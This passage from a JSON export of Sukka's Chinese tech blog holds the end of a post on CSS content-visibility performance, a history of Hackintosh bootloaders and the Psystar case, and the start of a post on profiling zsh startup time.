开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\">\n<div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-03</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 IO80211Family。</p></blockquote>\n<p>同年，来自 tonymacx86 的 MacMan 开发了 <a href=\"https://tonymacx86.blogspot.com/2011/04/chimera-unified-chameleon-bootloader.html\">变色龙的一个分支 Chimera</a>。tonymacx86 社区提供的工具 UniBeast（以及后来的 MultiBeast）内置了 Chimera、大大简化了黑苹果的安装。</p>\n<h2>来到 Clover（四叶草）的时代</h2>\n<p>不论是 David Elliott 的 Boot-dfe 还是变色龙，都是基于一个模拟的 EFI 环境。这意味着：</p>\n<ul>\n<li>黑苹果不能安装 BootCamp 实现 Windows 和 Mac OS X 之间切换</li>\n<li>黑苹果无法进入恢复模式，因为变色龙无法引导 Recovery HD 分区</li>\n<li>黑苹果的硬盘不能使用 GUID 分区表（GPT），因为变色龙不支持 GPT、只支持 MBR</li>\n</ul>\n<p>微软从 Windows 7 开始对 UEFI 引导提供初步支持、主流 PC 和笔记本厂商都逐渐用 EFI 代替 Legacy BIOS；同时随着大于 2TiB 的硬盘的出现，GPT 越来越流行，Hackintosher 对支持 GPT 的、真正的 UEFI Bootloader 的呼声越来越高。</p>\n<p>Clover 的历史可以回溯到 2006 年出现的一个 FreeBSD 发行版 TrueOS。TrueOS 社区的 Christoph Pfisterer 开发了一个带有图形化界面的 UEFI Bootloader「rEFIt」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/7.png\" width=\"803\" height=\"378\" class=\"lazy post-img\"></p>\n<p>2011 年 Christoph Pfisterer 中止了 rEFIt 的开发。次年，开发者 Roderick W. Smith Fork 了 rEFIt、成立了 rEFInd 项目。同年，Slice 和 OSx86 社区讨论开发一个 UEFI Bootloader：除了支持和变色龙一样模拟 EFI 环境外、还需要兼容真正的 UEFI 环境；要能正确读取 HFS+ 分区；式、能够修补 ACPI、加载 kext、加载 SMBIOS、内置 Quirk 以在 PC 上启动 macOS。社区决定这个 Bootloader 应该基于 rEFInd 开发。2012 年，OS X 10.8 Mountain Lion 正式发布，同年 Clover 发布了第一个版本：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/8.png\" width=\"622\" height=\"533\" class=\"lazy post-img\"></p>\n<p>2014 年 10 月 16 日 OS X 10.10 Yosemite 发布，次日 Voodoo 团队发布了变色龙最后一个正式版本 2.2，提供了 Yosemite 的引导支持。</p>\n<blockquote><p>正是从 OS X 10.10 Yosemite 开始，Hackintosher 开始倾向于使用苹果发布的原始 OS X 系统镜像、使用尽可能少的 kext 和 Patch，以保证黑苹果的稳定性。</p></blockquote>\n<p>2015 年 9 月 30 日，OS X 10.11 El Capitan 发布，tonymacx86 出品的黑苹果安装工具 UniBeast 将内置的 Bootloader 从变色龙的分支 Chimera 替换为 Clover，正式宣告变色龙寿终正寝。</p>\n<h2>尾声：几个时间</h2>\n<p>截至本文写就，macOS 11.0 Big Sur 已经进入 Public Beta 5，苹果已经宣布未来 Mac 将会从 Intel 切换到 ARM 架构的 Apple Silicon。不少 Hackintosher 都在担心黑苹果的未来。本文就以对几个时间点的探讨作为结尾吧。</p>\n<h3>Clover 用了多久才取代了 Chameleon（变色龙）？</h3>\n<ul>\n<li>2008 年初 Chameleon 发布了首个版本</li>\n<li>2012 年 Clover 发布了首个版本</li>\n<li>2014 年 10 月 17 日 Chameleon 发布了最后一个版本</li>\n</ul>\n<p>Clover 从发布第一个版本发布到取代 Chameleon 只用了 2 年。</p>\n<h3>苹果从 PowerPC 切换到 Intel 用了多久？</h3>\n<ul>\n<li>2005 年 6 月 6 日苹果召开 WWDC 2005，宣布苹果将从 PowerPC 切换到 Intel</li>\n<li>2006 年 1 月 10 日苹果发布了第一台使用 Intel 的 MacBook Pro</li>\n<li>2009 年 8 月 28 日苹果发布了 Mac OS X 10.6 Snow Leopard，正式停止对 PowerPC 的支持。 </li>\n</ul>\n<p>也就是说，苹果从宣布切换到 Intel 到 Mac OS X 放弃 PowerPC 支持用了 4 年。</p>\n<h3>OpenCore 什么时候会取代 Clover？</h3>\n<p>OpenCore 0.0.1 发布于 2019 年 5 月 4 日。如果 Clover 只用了两年就完成了从发布到取代变色龙，那么明年 OpenCore 就会完全取代 Clover（指 Clover 终止开发）。然而抛开历史背景讲历史就是在耍流氓，前面的章节我们看到了变色龙的诸多缺陷（模拟的 UEFI、不支持 GPT 等），被 Clover 取代是必然的。但是现在 Clover 并没有明显的弊端、而 OpenCore 也没有非常显著的优势，加之 Clover 的维护仍然非常活跃，因此在可预见的未来中 Clover 和 OpenCore 仍然会同时存在。</p>\n<h3>苹果什么时候会放弃 Intel 的 x86 架构？</h3>\n<p>这可能是 Hackintosher 们最关心的问题了。如果套用苹果从 PowerPC 切换 Intel 的时间表，那么苹果会在 WWDC 开完后第二年（也就是 2021 年）就会将所有 Mac 切换为 ARM 架构（不再发布搭载 Intel 处理器的 Mac）、而 macOS 则会在三年后（也就是 2024 年）正式放弃对 Intel 处理器的支持。</p>\n<p>但是，现在苹果的策略和 15 年前的还是存在着重大区别 —— WWDC 2005 开完以后，苹果在 2005 年下半年没有再发布任何新 Mac，主要是释出现有的 PowerPC 架构的 Mac 的性能升级（增加运行内存、硬盘扩容等），接着整个 2006 年都没有发布 PowerPC 架构的 Mac、全部产品线都切换到 Intel 架构；而 WWDC 2020 之后，苹果却还是发布了搭载 10 代 Intel 处理器的 27 寸的 iMac 2020。显然，这一次苹果在更换架构这件事上要保守许多，苹果甚至可能在到 2021 年都会发布搭载 Intel 11 代处理器的 Mac。</p>\n<p>另外，我们还可以再列一张关于 macOS 的时间表：</p>\n<ul>\n<li>OS X 10.10 Yosemite 发布于 2014 年 10 月 16 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2015 年 8 月 15 日。</li>\n<li>OS X 10.11 El Caption 发布于 2015 年 9 月 30 日、兼容 2007 年及以后的 iMac 和 MacBook Pro，最后更新于 2018 年 7 月 9 日。</li>\n<li>macOS 10.12 Sierra 发布于 2016 年 9 月 20 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 9 月 26 日。</li>\n<li>macOS 10.13 High Sierra 发布于 2017 年 9 月 25 日，兼容 2009 年下半年发布的 iMac 和 MacBook，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.14 Mojave 发布于 2018 年 9 月 24 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，最后更新于 2019 年 12 月 10 日。</li>\n<li>macOS 10.15 Catalina 发布于 2019 年 10 月 7 日，兼容 2010 年的 iMac Pro 和 2012 年下半年发布的所有 Mac，截至本文写就仍在维护。</li>\n<li>macOS 11.0 Big Sur 于 2020 年 6 月 22 日开始内测，兼容 2013 年上半年发布的 MacBook Air，截至本文写就仍处于公测阶段。</li>\n</ul>\n<p>通过这张时间表可以发现，过去 6 年的每个 macOS 大版本都会兼容至少 7 年以前发布的设备。因此就算苹果从 2021 年开始再也不发布搭载 Intel 处理器的 Mac，macOS 可能也需要到 2025 年才会终止对 Intel 处理器的支持。</p>\n<div class=\"license\">\n<div class=\"license-title\">黑苹果的历史</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/history-osx86/\">https://blog.skk.moe/post/history-osx86/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-09-02</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/history-osx86/"},{"title":"我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化","date":"2020-08-10 03:59:00","description":"\n<p>不论是在 WSL、Linux 还是 macOS 上，强大的 zsh 一直是我的不二法宝，而 oh my zsh 自然成了最趁手的瑞士军刀，我自己还编写了数个 oh my zsh 插件和主题。直到有一天我突然发现：见鬼，为什么开个 iTerm2 的 Tab 要等上好几秒钟？</p>\n<span></span><h2>zsh 启动耗时测量</h2>\n<p>首先，我们需要一个客观衡量 zsh 启动速度的标准，而使用 macOS 和众多 Linux 发行版中自带的 <code>time</code> 可以轻松计算任何命令的执行用时，包括 shell：</p>\n<pre><code class=\"hljs bash\">$ /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>        1.77 real         1.04 user         0.95 sys</code></pre>\n<p><code>time</code> 输出了 zsh 启动时 user-land 和 system 用时，而我的 zsh 启动用时将近 2 秒钟。为了获得更精确的结果，使用 for 循环连续启动 zsh 5 次：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        1.74 real         1.02 user         0.92 sys        1.69 real         1.00 user         0.90 sys        1.71 real         1.01 user         0.91 sys        1.68 real         0.99 user         0.89 sys        1.74 real         1.02 user         0.93 sys</code></pre>\n<p>为了排除 zsh 本身的性能问题，使用 zsh 的 <code>--no-rcs</code> 参数进行测试：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 20); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh --no-rcs -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys        0.00 real         0.00 user         0.00 sys</code></pre>\n<p>不加载 <code>.zshrc</code> 时，zsh 的启动速度是如此的快，以至于 <code>time</code> 给出了 <code>0.00</code> 的结果。</p>\n<h2>Profiling</h2>\n<p>zsh 提供了专门的 profiling 模块 <code>zprof</code> 用于衡量 zsh 各个函数的执行用时。在 <code>.zshrc</code> 文件第一行添加下述命令用于加载 <code>zprof</code> 模块：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/<span class=\"hljs-built_in\">zprof</span></code></pre>\n<p>接着启动 zsh、并使用 <code>zprof</code> 命令获取各函数用时数据：</p>\n<pre><code class=\"hljs bash\">$ /bin/zsh$ <span class=\"hljs-built_in\">zprof</span>num  calls                time                       self            name----------------------------------------------------------------------------------- 1)    1         395.66   395.66   33.10%    395.59   395.59   33.09%  _zsh_nvm_auto_use 2)    1         216.22   216.22   18.09%    216.13   216.13   18.08%  nvm_die_on_prefix 3)    1         648.00   648.00   54.20%    168.85   168.85   14.12%  nvm_auto 4)    2         479.15   239.57   40.08%    160.50    80.25   13.43%  nvm 5)    1         102.30   102.30    8.56%     84.99    84.99    7.11%  nvm_ensure_version_installed 6)    2          51.21    25.60    4.28%     29.55    14.78    2.47%  compinit 7)    1         680.18   680.18   56.89%     22.17    22.17    1.85%  _zsh_nvm_load 8)    2          21.66    10.83    1.81%     21.66    10.83    1.81%  compaudit 9)    1          17.31    17.31    1.45%     17.31    17.31    1.45%  nvm_is_version_installed10)  193          17.43     0.09    1.46%     14.50     0.08    1.21%  _zsh_autosuggest_bind_widget[Redacted]</code></pre>\n<p><code>zprof</code> 模块只能获取每个 zsh 函数的用时，因此适合找出拖累 zsh 冷启动的 oh my zsh 的插件。如果要获取完整的 <code>.zshrc</code> 性能分析，应该使用 <code>xtrace</code>。在 <code>.zshrc</code> 开头添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># .zshrc</span><span class=\"hljs-built_in\">zmodload</span> zsh/datetime<span class=\"hljs-built_in\">setopt</span> PROMPT_SUBSTPS4=<span class=\"hljs-string\">'+$EPOCHREALTIME %N:%i&gt; '</span>logfile=$(mktemp zsh_profile.7Pw1Ny0G)<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"Logging to <span class=\"hljs-variable\">$logfile</span>\"</span><span class=\"hljs-built_in\">exec</span> 3&gt;&amp;2 2&gt;<span class=\"hljs-variable\">$logfile</span><span class=\"hljs-built_in\">setopt</span> XTRACE</code></pre>\n<p>并在 <code>.zshrc</code> 结尾添加如下命令：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 